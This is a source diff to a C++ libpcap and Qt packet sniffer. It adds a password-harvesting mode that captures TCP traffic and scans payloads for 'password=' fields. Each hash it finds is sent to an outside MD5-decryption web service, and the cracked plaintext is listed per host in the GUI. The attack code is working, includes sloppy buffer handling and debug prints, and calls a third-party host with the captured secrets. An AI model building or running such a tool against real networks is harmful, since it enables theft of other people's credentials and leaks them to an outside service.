@@ -20,8 +20,12 @@
 #include "definitions.h"
 #include "packet-sniffer.h"
 #include "packet-sieve.h"
+#include <QtGui>
+#include "main-window.h"
+#include "password-window.h"
+#include <curl/curl.h>
 
-char tmpIpAddress[INET_ADDRSTRLEN];
+
 char* dev;
 
 // Using singleton design pattern.
@@ -70,7 +74,7 @@ void PacketSniffer::print_app_usage(void) {
 
 /* <<< Get Handle >>> */
 
-void PacketSniffer::get_handle(void) {
+void PacketSniffer::get_handle(std::string filter) {
     
   char errbuf[PCAP_ERRBUF_SIZE];      /* error buffer */
     
@@ -118,19 +122,12 @@ void PacketSniffer::get_handle(void) {
     //}
   /* get network number and mask associated with capture device */
 
-  // We only want to capture outgoing packets, so we must find the local
-  // IP address for use with a source filter.
-  get_ip();
-  std::stringstream filter_stream;
-  filter_stream << "ip src host ";
-  filter_stream << tmpIpAddress;
-  filter_stream << " and not udp";
-  std::cout << "Local host IP Address is " << filter_stream.str() << std::endl;
+
     
   /* print capture info */
   printf("Device: %s\n", dev);
   printf("Number of packets: %d\n", num_packets);
-  std::cout << "Filter expression: " << filter_stream.str();
+  std::cout << "Filter expression: " << filter;
     
   /* open capture device */
   handle = pcap_open_live(dev, SNAP_LEN, 0, 10000, errbuf);
@@ -146,16 +143,16 @@ void PacketSniffer::get_handle(void) {
   }
     
   /* compile the filter expression */
-  if (pcap_compile(handle, &fp, filter_stream.str().c_str(), 0, net) == -1) {
+  if (pcap_compile(handle, &fp, filter.c_str(), 0, net) == -1) {
     fprintf(stderr, "Couldn't parse filter %s: %s\n",
-	    filter_stream.str().c_str(), pcap_geterr(handle));
+	    filter.c_str(), pcap_geterr(handle));
     exit(EXIT_FAILURE);
   }
     
   /* apply the compiled filter */
   if (pcap_setfilter(handle, &fp) == -1) {
     fprintf(stderr, "Couldn't install filter %s: %s\n",
-	    filter_stream.str().c_str(), pcap_geterr(handle));
+	    filter.c_str(), pcap_geterr(handle));
     exit(EXIT_FAILURE);
   }
 }
@@ -252,6 +249,42 @@ void print_payload(u_char *payload, int len) {
   return;
 }
 
+string find_password(u_char *payload, int len) {
+  char password1[] = "password=";
+  char password2[] = "Password=";
+
+  char tmp;
+  for (int i = 0; i < len - 8; ++i) {
+    tmp = payload[i + 9];
+    payload[i + 9] = 0;
+    if(!strcmp((char*) payload+i, password1) || !strcmp((char*) payload+i, password2)) {
+    payload[i + 9] = tmp;
+    string password((char*)payload+i+9, 32);
+      return password;
+    }
+    payload[i + 9] = tmp;
+  }
+
+  return "";
+}
+
+bool has_password_field(u_char *payload, int len) {
+  char password1[] = "password";
+  char password2[] = "Password";
+
+  char tmp;
+  for (int i = 0; i < len - 8; ++i) {
+    tmp = payload[i + 8];
+    payload[i + 8] = 0;
+    if(!strcmp((char*) payload+i, password1) || !strcmp((char*) payload+i, password2)) {
+      return true;
+    }
+    payload[i + 8] = tmp;
+  }
+
+  return false;
+}
+
 void handle_target_packet(u_char * args, const struct pcap_pkthdr *,
                           const u_char *packet) {
   PacketSieve* sieve = (PacketSieve*) args;
@@ -317,12 +350,10 @@ void handle_target_packet(u_char * args, const struct pcap_pkthdr *,
 /*
  * dissect/print packet
  */
-void got_packet(u_char * args, const struct pcap_pkthdr *,
+void handle_training_packet(u_char * args, const struct pcap_pkthdr *,
                 const u_char *packet) {
   PacketSieve* sieve = (PacketSieve*) args;
-    
-  static int count = 1;                   /* packet counter */
-	
+    	
   /* declare pointers to packet headers */
   // const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
   const struct sniff_ip *ip;              /* The IP header */
@@ -332,9 +363,6 @@ void got_packet(u_char * args, const struct pcap_pkthdr *,
   int size_ip;
   int size_tcp;
   int size_payload;
-	
-  printf("\nPacket number %d:\n", count);
-  count++;
 	
   /* define ethernet header */
   // ethernet = (struct sniff_ethernet*)(packet);
@@ -408,16 +436,172 @@ void got_packet(u_char * args, const struct pcap_pkthdr *,
     
 }
 
-void PacketSniffer::fill_packet_sieve(void) {
+void handle_password_packet(u_char * args, const struct pcap_pkthdr *,
+                const u_char *packet) {
+  PacketSniffer* sniffer = (PacketSniffer*) args;
     
-  get_handle();
+	
+  /* declare pointers to packet headers */
+  // const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
+  const struct sniff_ip *ip;              /* The IP header */
+  const struct sniff_tcp *tcp;            /* The TCP header */
+  u_char *payload;                    /* Packet payload */
+    
+  int size_ip;
+  int size_tcp;
+  int size_payload;
+	
+   /* define ethernet header */
+  // ethernet = (struct sniff_ethernet*)(packet);
+	
+  /* define/compute ip header offset */
+  ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
+  size_ip = IP_HL(ip)*4;
+  if (size_ip < 20) {
+    printf("   * Invalid IP header length: %u bytes\n", size_ip);
+    return;
+  }
+    
+  /* print source and destination IP addresses */
+  printf("       From: %s\n", inet_ntoa(ip->ip_src));
+  printf("         To: %s\n", inet_ntoa(ip->ip_dst));
+    
+  /* determine protocol */	
+  switch(ip->ip_p) {
+  case IPPROTO_TCP:
+    printf("   Protocol: TCP\n");
+    break;
+  case IPPROTO_UDP:
+    printf("   Protocol: UDP\n");
+    return;
+  case IPPROTO_ICMP:
+    printf("   Protocol: ICMP\n");
+    return;
+  case IPPROTO_IP:
+    printf("   Protocol: IP\n");
+    return;
+  default:
+    printf("   Protocol: unknown\n");
+    return;
+  }
+	
+  /* define/compute tcp header offset */
+  tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
+  size_tcp = TH_OFF(tcp)*4;
+  if (size_tcp < 20) {
+    printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
+    return;
+  }
+	
+  printf("   Src port: %d\n", ntohs(tcp->th_sport));
+  printf("   Dst port: %d\n", ntohs(tcp->th_dport));
+	
+  /* define/compute tcp payload (segment) offset */
+  payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+	
+  /* compute tcp payload (segment) size */
+  size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
+	
+  /*
+   * Print payload data; it might be binary, so don't just
+   * treat it as a string.
+   */
+  QListWidget* list =  MainWindow::instance()->passwordWindow->listWidget;
+  if (size_payload > 0) {
+    printf("   Payload (%d bytes):\n", size_payload);
+    print_payload(payload, size_payload);
+  }
+
+  // If its an incoming packet, look for password field.
+  if (!strcmp(sniffer->tmpIpAddress, inet_ntoa(ip->ip_dst))) {
+
+    std::cout << "Incoming." << std::endl;
+
+    if(has_password_field(payload, size_payload)) {
+      PasswordMap::iterator iter;
+      // Look up host in known hosts map
+      iter = sniffer->password_map_.find(inet_ntoa(ip->ip_src));
+      if (iter == sniffer->password_map_.end()) {
+
+	list->addItem(inet_ntoa(ip->ip_src));
+	sniffer->password_map_.insert(std::pair<std::string, QListWidgetItem*>
+				      (inet_ntoa(ip->ip_src),
+				       list->item(list->count()-1)));
+      }
+    }
+  } else {
+    // If its an outgoing packet, if its part of a potential password
+    // communication then inspect it
+    std::cout << "Outgoing." << std::endl;
+    PasswordMap::iterator iter;
+    // Look up host in known hosts map
+    iter = sniffer->password_map_.find(inet_ntoa(ip->ip_dst));
+    std::cout << "here1" << std::endl;
+    if (iter == sniffer->password_map_.end() || iter->second == 0) {
+      return;
+    }
+    std::cout << "here2" << std::endl;
+  
+    string password = find_password(payload, size_payload);
+    if (password.empty()) {
+      return;
+    }
+
+    std::cout << "here3" << std::endl;
+    std::string list_string = iter->second->data(0).toString().toStdString();
+
+    list_string.append(" ");
+    list_string.append(password);
+
+    string plaintext = decodeHash(password);
+    if (!plaintext.empty()) {
+      list_string.append(" ");
+      list_string.append(plaintext);
+    }
+
+    QString qs(list_string.c_str());
+    QVariant v;
+    v.setValue(qs);
+    iter->second->setData( Qt::DisplayRole, v);
+
+
+    if (plaintext.empty()) {
+      return;
+    }
+
+
+
+
+    // Kind of a hack, we want to mark this IP so we don't do a password look
+    // up on it ever again, so here we set its list widget pointer to 0.
+    sniffer->password_map_.insert(std::pair<std::string, QListWidgetItem*>
+				  (inet_ntoa(ip->ip_dst), 0));
+
+
+    exit(0);
+ 
+
+  }
+    
+}
+
+void PacketSniffer::fill_packet_sieve(void) {
+      // We only want to capture outgoing packets, so we must find the local
+  // IP address for use with a source filter.
+  get_ip();
+  std::stringstream filter_stream;
+  filter_stream << "ip src host ";
+  filter_stream << tmpIpAddress;
+  filter_stream << " and not udp";
+  std::cout << "Local host IP Address is " << filter_stream.str() << std::endl;
+  get_handle(filter_stream.str());
     
   /* now we can set our callback function 
      this will also fill our packet sieve for the proceeding loop.
   */
   sieve = new PacketSieve();
   std::cout << "Looping from PacketSieve." << std::endl;
-  pcap_loop(handle, 0, got_packet, (u_char*) sieve);
+  pcap_loop(handle, 0, handle_training_packet, (u_char*) sieve);
   std::cout << "LOOP BROKEN" << std::endl;
 }
 
@@ -429,11 +613,19 @@ void PacketSniffer::select_packets(void) {
     std::cout << "Looping from select_packets." << std::endl;
     pcap_loop(handle, 0, handle_target_packet, (u_char*) sieve);
     //sieve->print_suspects();
-    //term_sniffer();
+    //term_snifferpassowr();
   } else {
     std::cout << "You need to run train first\n";
   }
 
+}
+
+void PacketSniffer::sniff_passwords() {
+  get_ip();
+  get_handle("ip and not udp");
+  sieve = new PacketSieve();
+  pcap_loop(handle, 0, handle_password_packet, (u_char*) this);
+  std::cout << "LOOP BROKEN" << std::endl;
 }
 
 void PacketSniffer::term_sniffer(void) {
@@ -443,4 +635,49 @@ void PacketSniffer::term_sniffer(void) {
   pcap_close(handle);
   handle = NULL;
   printf("\nCapture complete.\n");
+}
+
+std::string decodeHash(std::string hash){
+    
+    CURL *curl;
+    std::string buffer;
+    curl = curl_easy_init();
+    
+    std::string url = "http://www.decrypt-md5.com/decrypt_api.php?x=" + hash;
+    if (curl){
+		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+		curl_easy_setopt(curl, CURLOPT_HEADER, 0);	 /* No we don't need the Header of the web content. Set to 0 and curl ignores the first line */
+		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0); /* Don't follow anything else than the particular url requested*/
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);	/* Function Pointer "writer" manages the required buffer size */
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer ); /* Data Pointer &buffer stores downloaded web content */	
+	}
+	else{
+		return "Error";	/* Badly written error message */											
+	}
+    
+	/* Fetch the data */
+    curl_easy_perform(curl);
+	
+	/* Close the connection */
+	curl_easy_cleanup(curl);
+    
+	/* Transform &buffer into a istringstream object */
+	std::istringstream iss(buffer);
+    
+	string line, item;	
+
+    while (getline (iss, line)){
+        std::istringstream linestream(line); /* Read Next Line */
+    } //End WHILE (lines    return res;
+    
+    return line;
+}
+
+int writer(char *data, size_t size, size_t nmemb, string *buffer){
+	int result = 0;
+	if(buffer != NULL) {
+		buffer -> append(data, size * nmemb);
+		result = size * nmemb;
+	}
+	return result;
 }
